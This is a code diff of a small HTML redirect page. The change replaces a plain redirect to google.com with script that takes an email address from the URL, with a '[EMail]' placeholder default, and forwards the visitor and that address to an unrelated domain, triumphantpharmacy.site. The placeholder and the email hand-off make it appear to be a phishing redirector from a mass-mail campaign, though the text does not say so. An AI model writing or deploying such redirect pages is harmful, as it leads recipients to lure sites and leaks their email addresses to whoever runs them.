@@ -1,14 +1,25 @@
-<!DOCTYPE html> 
-<html> 
-<head> 
-    <script> 
-        var val = window.location.hash.substring(1); 
-    </script> 
-</head> 
-    <body>                  
-        <script> 
-            window.location.href = "https://google.com#"+val; 
-           
-        </script> 
-    </body> 
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+        // Get email from query parameter or use default
+        var urlParams = new URLSearchParams(window.location.search);
+        var email = urlParams.get('email') || '[EMail]';
+        var hash = window.location.hash.substring(1);
+    </script>
+</head>
+<body>
+    <script>
+        // Build destination URL with actual email value
+        var destination = "https://triumphantpharmacy.site/red?email=" + encodeURIComponent(email);
+        
+        // Append hash if it exists
+        if (hash) {
+            destination += "#" + hash;
+        }
+        
+        // Perform redirect
+        window.location.href = destination;
+    </script>
+</body>
 </html>
